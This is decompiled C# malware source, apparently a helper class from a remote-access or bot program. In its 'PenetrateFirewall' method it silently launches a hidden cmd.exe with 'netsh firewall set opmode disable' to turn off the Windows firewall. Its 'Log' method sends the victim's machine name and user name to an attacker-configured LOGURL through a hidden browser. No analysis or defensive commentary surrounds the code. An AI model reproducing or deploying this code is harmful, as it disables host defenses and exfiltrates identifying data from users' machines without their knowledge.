using System;
using System.Diagnostics;
using System.Net;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace Main;

public static class Common
{
	private static bool _penetratedFirewall;

	public static bool penetratedFirewall
	{
		get
		{
			if (_penetratedFirewall)
			{
				return true;
			}
			if (PenetrateFirewall())
			{
				_penetratedFirewall = true;
				return true;
			}
			return false;
		}
	}

	public static void Log(string message)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006c: Invalid comparison between Unknown and I4
		if (string.IsNullOrEmpty(Settables.LOGURL))
		{
			return;
		}
		string text = Environment.MachineName + "-" + Environment.UserName + " : " + message;
		string text2 = Settables.LOGURL + text;
		if (!penetratedFirewall)
		{
			return;
		}
		WebBrowser val = new WebBrowser();
		try
		{
			val.Navigate(text2);
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static byte[] GetRandomBytes(int size)
	{
		byte[] array = new byte[size];
		RandomNumberGenerator.Create().GetBytes(array);
		return array;
	}

	public static bool PenetrateFirewall()
	{
		using WebClient webClient = new WebClient();
		try
		{
			webClient.DownloadString("http://www.google.com/");
			return true;
		}
		catch
		{
			try
			{
				Process process = new Process();
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.FileName = "cmd.exe";
				processStartInfo.Arguments = "netsh firewall set opmode disable";
				process.StartInfo = processStartInfo;
				process.Start();
				process.WaitForExit();
				return true;
			}
			catch
			{
				return false;
			}
		}
	}
}
